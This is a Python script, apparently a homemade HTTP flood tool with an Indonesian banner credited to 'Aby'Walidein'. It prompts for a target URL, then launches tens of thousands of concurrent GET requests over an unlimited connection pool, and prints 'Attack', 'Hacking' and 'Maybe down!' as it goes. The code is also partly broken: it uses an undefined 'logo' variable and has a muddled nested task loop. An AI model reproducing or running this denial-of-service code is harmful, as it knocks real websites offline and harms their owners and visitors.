#!/usr/bin/python3
# -*- coding: utf-8 -*-
import asyncio
import aiohttp
import os
import fade
# Clear command prompt based on the operating system
class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m' 
    PURPLE = '\033[38;5;141m'  
    TEAL = '\033[38;5;37m'     
    PINK = '\033[38;5;206m'    
    LIME = '\033[38;5;154m'    
    CYAN_BLUE = '\033[38;5;39m'  
    DARK_GREEN = '\033[38;5;22m' 
    SKY_BLUE = '\033[38;5;111m'  
    DARK_ORANGE = '\033[38;5;166m' 
    INDIGO = '\033[38;5;57m'  
    GRAY = '\033[38;5;242m'   
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m' 

# Clear command prompt based on the operating system
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
    os.system("clear")
print("""
 \033[38;5;39m╔═════╗   ╔═══╗    ╔═══════╗
 \033[38;5;39m██████╝   ████ ║   ████████║
 \033[38;5;39m█║          █║     █║       █║
 \033[38;5;39m█║          █║     █║       █║
 \033[38;5;39m█║          █╚═══█║       █║
 \033[38;5;39m█╚════╗  ██████║       █║
 \033[38;5;39m██████╝  █╝     █╝       █╝
 \033[38;5;39m 
 \033[38;5;39m
 \033[38;5;39m
 \033[38;5;206m╔══╗ ╗  ╔
 \033[38;5;206m║║   ║║  ║ 
 \033[38;5;206m║║   ╚║  ╝
 \033[38;5;206m║║     ║║
 \033[38;5;206m╚══╝ ╚╝
╔═════════════════════════════════════════════════════════════════╗
║\033[33m                ~ H U D A I R U L  A L - A Q S H A ~             \033[31m║
║\033[32m                    I N T E R N A L  S C R I P T                 \033[31m║
║\033[96m                           By: Aby'Walidein                      \033[31m║
║\033[37m                               ——o0o——                           \033[31m║
╚ ═════════════════════════════════════════════════════════════════╝
""")
faded_text = fade.fire(logo)
print(faded_text)
ask = fade.pinkred("\033[33m==⟩⟩ RUN SC BUTUH WKT 35 DETIK DG TARGET URL: \033[0m")
url = input(ask)
print("\033[96mMOHON BERSABAR KARENA INI BUKAN UJIAN..! 🤭\033[0m")

async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                print("\033[95m[💥] \033[96mHUDAIRUL-AQSHA \033[97m Attack \033[33m" +str(url)+ "  \033[31mHacking\033[0m")
            else:
                print("\033[33m[*] \033[33mHUDAIRUL-AQSHA \033[36m Attack  \033[35m" +str(url)+ "  \033[93mHacking\033[0m")
    except aiohttp.ClientError as e:
            print("\033[31m[!] \033[32mHUDAIRUL-AQSHA \033[31m Attack  \033[33m" +str(url)+ "  \033[37mMaybe down!\033[0m")

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
